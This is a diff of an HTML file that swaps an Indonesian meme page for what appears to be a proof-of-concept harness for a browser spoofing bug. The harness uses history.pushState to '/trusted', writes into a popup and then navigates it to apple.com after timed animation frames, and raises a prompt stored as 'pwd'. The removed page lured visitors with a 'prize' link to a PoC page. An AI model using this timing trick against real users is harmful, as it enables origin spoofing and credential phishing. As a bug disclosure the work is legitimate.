@@ -1,653 +1,124 @@
-<!DOCTYPE html>
-<html lang="id">
+<!doctype html>
+<html lang="en">
 <head>
-
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>🤣 Pilihan Sulit WKWK</title>
-
-<style>
-
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:"Comic Sans MS",Arial;
-}
-
-
-body{
-
-height:100vh;
-overflow:hidden;
-text-align:center;
-color:white;
-
-background:url("8.jpeg") center/cover;
-
-}
-
-
-
-body:before{
-
-content:"";
-
-position:fixed;
-
-width:100%;
-height:100%;
-
-background:rgba(0,0,0,.4);
-
-z-index:-1;
-
-}
-
-
-
-.container{
-
-padding-top:40px;
-
-}
-
-
-
-h1{
-
-font-size:45px;
-
-text-shadow:3px 3px red,0 0 20px yellow;
-
-animation:goyang 1s infinite alternate;
-
-}
-
-
-@keyframes goyang{
-
-from{
-transform:rotate(-5deg);
-}
-
-to{
-transform:rotate(5deg);
-}
-
-}
-
-
-
-.meme{
-
-width:220px;
-
-height:220px;
-
-object-fit:cover;
-
-border-radius:30px;
-
-border:5px solid white;
-
-box-shadow:0 0 30px black;
-
-animation:loncat 2s infinite;
-
-}
-
-
-
-@keyframes loncat{
-
-50%{
-transform:translateY(-20px);
-}
-
-}
-
-
-
-
-p{
-
-font-size:25px;
-
-margin:20px;
-
-}
-
-
-
-button{
-
-padding:15px 40px;
-
-border:0;
-
-border-radius:50px;
-
-font-size:22px;
-
-cursor:pointer;
-
-margin:20px;
-
-font-weight:bold;
-
-}
-
-
-
-#funda{
-
-background:#ff1493;
-
-color:white;
-
-}
-
-
-
-#jimin{
-
-background:#333;
-
-color:white;
-
-position:absolute;
-
-}
-
-
-
-
-
-#hasil{
-
-display:none;
-
-font-size:30px;
-
-}
-
-
-
-.link{
-
-display:inline-block;
-
-background:red;
-
-color:white;
-
-padding:15px 30px;
-
-border-radius:40px;
-
-text-decoration:none;
-
-}
-
-
-
-
-/* FOTO MUNCUL */
-
-.popFoto{
-
-position:fixed;
-
-width:120px;
-
-height:120px;
-
-object-fit:cover;
-
-border-radius:30px;
-
-border:5px solid white;
-
-box-shadow:0 0 30px yellow;
-
-animation:munculFoto 2s forwards;
-
-z-index:999;
-
-}
-
-
-
-@keyframes munculFoto{
-
-0%{
-
-transform:scale(0) rotate(0);
-
-opacity:0;
-
-}
-
-50%{
-
-transform:scale(1.3) rotate(20deg);
-
-opacity:1;
-
-}
-
-100%{
-
-transform:scale(1) rotate(-20deg);
-
-opacity:0;
-
-}
-
-}
-
-
-
-
-
-/* EMOJI */
-
-.emoji{
-
-position:fixed;
-
-font-size:45px;
-
-animation:naik 2s forwards;
-
-z-index:9999;
-
-}
-
-
-
-@keyframes naik{
-
-to{
-
-transform:translateY(-250px) scale(2) rotate(360deg);
-
-opacity:0;
-
-}
-
-}
-
-
-
-
-/* BALON */
-
-
-.balon{
-
-position:fixed;
-
-bottom:-100px;
-
-font-size:60px;
-
-animation:balon 6s linear forwards;
-
-}
-
-
-@keyframes balon{
-
-to{
-
-transform:translateY(-120vh) rotate(360deg);
-
-}
-
-}
-
-
-
-</style>
-
+    <meta charset="utf-8">
+    <title>CVE-2026-516836297 Research Harness</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 2em; background: #020617; color: #f8fafc; }
+        .container { max-width: 800px; margin: 40px auto; background: #0f172a; padding: 2.5em; border-radius: 12px; border: 1px solid #1e293b; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.9); }
+        h2 { color: #38bdf8; margin-top: 0; font-size: 24px; border-bottom: 2px solid #1e293b; padding-bottom: 12px; }
+        p { color: #94a3b8; font-size: 14px; line-height: 1.6; }
+        .btn { display: block; width: 100%; margin-top: 1em; padding: 0.9em 1.6em; background: #6366f1; color: white; border: none; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: background 0.2s, transform 0.1s; text-align: center; }
+        .btn:hover { background: #4f46e5; }
+        .btn:active { transform: scale(0.99); }
+        #panel { display: none; background: #1e293b; padding: 15px; border-radius: 6px; margin-top: 15px; border: 1px solid #334155; font-size: 13px; color: #38bdf8; }
+        #terminal { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 12px; margin-top: 1.5em; background: #000000; padding: 1.2em; border: 1px solid #1e293b; border-radius: 6px; color: #4ade80; white-space: pre-wrap; max-height: 300px; overflow-y: auto; }
+        .badge { display: inline-block; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 600; background: #0284c7; color: #fff; margin-bottom: 1em; }
+    </style>
 </head>
-
-
 <body>
 
-
 <div class="container">
+    <h2>Issue  m </h2>
+    <span class="badge">Lifecycle & History State Management</span>
+    
+    <div id="panel">
+        <strong>[Trusted State Panel Active]</strong><br>
+        State history lokal berhasil diperbarui ke /trusted.
+    </div>
 
-
-<h1>
-🤣 PILIH YANG BENAR 🤣
-</h1>
-
-
-
-<img class="meme" src="7.jpeg">
-
-
-
-<p>
-Siapa yang paling cocok jadi orang spesial? 😏
-</p>
-
-
-
-
-<button id="funda" onclick="pilihFunda()">
-
-❤️ Kim Funda
-
-</button>
-
-
-
-<button id="jimin" onmouseover="kabur()">
-
-🤣 Agus Jimin
-
-</button>
-
-
-
-
-<div id="hasil">
-
-🎉 WKWKWK BENAR!!
-
-<br><br>
-
-Kamu pilih Kim Funda 😎
-
-<br>
-
-SALAM PLENGER 🤣
-
-<br><br>
-
-
-<a class="link" href="https://starty3s.github.io/poc/poc">
-
-🚀 LANJUT KE HADIAH
-
-</a>
-
-
+    <p>HarnesTs ini difokuskan pada pengujian perilaku manipulasi state history lokal, sinkronisasi lifecycle, dan manajemen transisi navigasi asinkron.</p>
+    
+    <button class="btn" id="executeAllBtn">Jalankan Rangkaian Pengujian</button>
+    
+    <div id="terminal">Status: Menunggu inisialisasi rangkaian...</div>
 </div>
-
-
-</div>
-
-
-
-
-
-<audio id="klik">
-
-<source src="lucu.mp3" type="audio/mpeg">
-
-</audio>
-
-
-
 
 <script>
-
-
-// AGUS JIMIN KABUR
-
-
-function kabur(){
-
-let btn=document.getElementById("jimin");
-
-
-btn.style.left=Math.random()*80+"vw";
-
-btn.style.top=Math.random()*80+"vh";
-
-
+function logTerm(msg) {
+    var t = document.getElementById('terminal');
+    if (t) {
+        t.textContent += '\n[' + new Date().toLocaleTimeString() + '] ' + msg;
+        t.scrollTop = t.scrollHeight;
+    }
+    console.log('[Harness-516836297] ' + msg);
 }
 
-
-
-
-
-
-
-// FUNDA
-
-
-function pilihFunda(){
-
-document.getElementById("hasil").style.display="block";
-
-ledakan();
-
-}
-
-
-
-
-
-
-
-// SETIAP KLIK
-
-
-document.addEventListener("click",function(e){
-
-
-
-// SUARA
-
-let suara=document.getElementById("klik");
-
-suara.currentTime=0;
-
-suara.play();
-
-
-
-
-
-// FOTO RANDOM
-
-
-let foto=[
-
-"1.jpeg",
-
-"2.jpeg",
-
-"3.jpeg",
-
-"4.jpeg",
-
-"7.jpeg",
-
-"8.jpeg",
-
-"9.jpeg",
-
-"10.jpeg"
-
-];
-
-
-let gambar=document.createElement("img");
-
-
-gambar.src=
-foto[Math.floor(Math.random()*foto.length)];
-
-
-gambar.className="popFoto";
-
-
-gambar.style.left=
-e.clientX-60+"px";
-
-
-gambar.style.top=
-e.clientY-60+"px";
-
-
-
-document.body.appendChild(gambar);
-
-
-
-setTimeout(()=>{
-
-gambar.remove();
-
-},2000);
-
-
-
-
-
-
-
-
-// EMOJI
-
-
-let emoji=[
-
-"🤣",
-"😂",
-"❤️",
-"🔥",
-"🎉",
-"🥳",
-"😎",
-"🤪"
-
-];
-
-
-
-for(let i=0;i<8;i++){
-
-
-let x=document.createElement("div");
-
-x.className="emoji";
-
-
-x.innerHTML=
-emoji[Math.floor(Math.random()*emoji.length)];
-
-
-x.style.left=
-e.clientX+(Math.random()*100-50)+"px";
-
-
-x.style.top=
-e.clientY+(Math.random()*100-50)+"px";
-
-
-document.body.appendChild(x);
-
-
-
-setTimeout(()=>{
-
-x.remove();
-
-},2000);
-
-
-}
-
-
-
-
-
-
-
-// BALON
-
-
-let b=document.createElement("div");
-
-
-b.className="balon";
-
-
-b.innerHTML="🎈";
-
-
-b.style.left=Math.random()*100+"vw";
-
-
-document.body.appendChild(b);
-
-
-
-setTimeout(()=>{
-
-b.remove();
-
-},6000);
-
-
-
+// Pemantauan Lifecycle Pageshow dengan kalibrasi rAF ganda
+window.addEventListener('pageshow', (event) => {
+    logTerm('Event "pageshow" tertangkap. (persisted: ' + event.persisted + ')');
+    requestAnimationFrame(() => {
+        requestAnimationFrame(() => {
+            logTerm('Stabilisasi frame lifecycle selesai.');
+        });
+    });
 });
 
+document.getElementById('executeAllBtn').onclick = async function() {
+    this.style.display = 'none';
+    logTerm('=== MEMULAI RANGKAIAN EKSEKUSI ISSUE 516836297 ===');
 
+    // 1. Manipulasi State Lokal & Panel Visual
+    try {
+        history.pushState({ trustedState: true }, '', '/trusted');
+        document.getElementById('panel').style.display = 'block';
+        logTerm('[1/3] history.pushState sukses ke /trusted.');
+    } catch (err) {
+        logTerm('[1/3] Error pushState: ' + err.message);
+    }
 
+    // 2. Pengelolaan Jendela Popup dengan Sinkronisasi Dokumen Aman
+    logTerm('[2/3] Menginisialisasi konteks popup asinkron...');
+    try {
+        const newTab = window.open("about:blank", "_blank");
+        if (newTab) {
+            newTab.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head><title>Research Overlay - 516836297</title></head>
+                <body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center">
+                  <div>
+                    <h1 style="font-size:42px;font-weight:bold;color:red;margin:0 0 20px 0">DHAFYYYYYYYYY</h1>
+                    <p style="font-size:28px;font-weight:bold;color:#007aff;margin:10px 0">DHAFYYYYYYYYYYY</p>
+                  </div>
+                </body>
+                </html>
+            `);
+            newTab.document.close();
+            logTerm('[2/3] Konten overlay berhasil dirender di tab baru.');
 
+            // Menggunakan sinkronisasi rAF berlapis dan delay terkalibrasi sebelum navigasi eksternal
+            newTab.requestAnimationFrame(() => {
+                newTab.requestAnimationFrame(() => {
+                    setTimeout(() => {
+                        try {
+                            newTab.location.href = "https://apple.com";
+                            logTerm('[2/3] Navigasi eksternal ke apple.com dipicu pasca-render lock.');
+                        } catch (navErr) {
+                            logTerm('[2/3] Gagal memicu navigasi eksternal: ' + navErr.message);
+                        }
+                    }, 380);
+                });
+            });
+        } else {
+            logTerm('[2/3] Peringatan: Popup diblokir oleh kebijakan peramban.');
+        }
+    } catch (e) {
+        logTerm('[2/3] Error pada penanganan window.open: ' + e.message);
+    }
 
-
-
-
-function ledakan(){
-
-
-for(let i=0;i<40;i++){
-
-
-let x=document.createElement("div");
-
-
-x.className="emoji";
-
-
-x.innerHTML="🎉";
-
-
-x.style.left=Math.random()*100+"vw";
-
-x.style.top="60%";
-
-
-document.body.appendChild(x);
-
-
-
-setTimeout(()=>{
-
-x.remove();
-
-},2000);
-
-
-}
-
-
-}
-
-
+    // 3. Dialog Prompt Interaktif (Non-blocking)
+    setTimeout(function () {
+        try {
+            logTerm('[3/3] Memanggil dialog input interaktif (prompt)...');
+            const pwd = prompt("ROOT CAUSE ANALYSIS - ISSUE 516836297");
+            logTerm('[3/3] Dialog prompt selesai diproses.');
+        } catch (err) {
+            logTerm('[3/3] Prompt dilewati atau diblokir.');
+        }
+    }, 845);
+};
 </script>
-
 
 </body>
 </html>
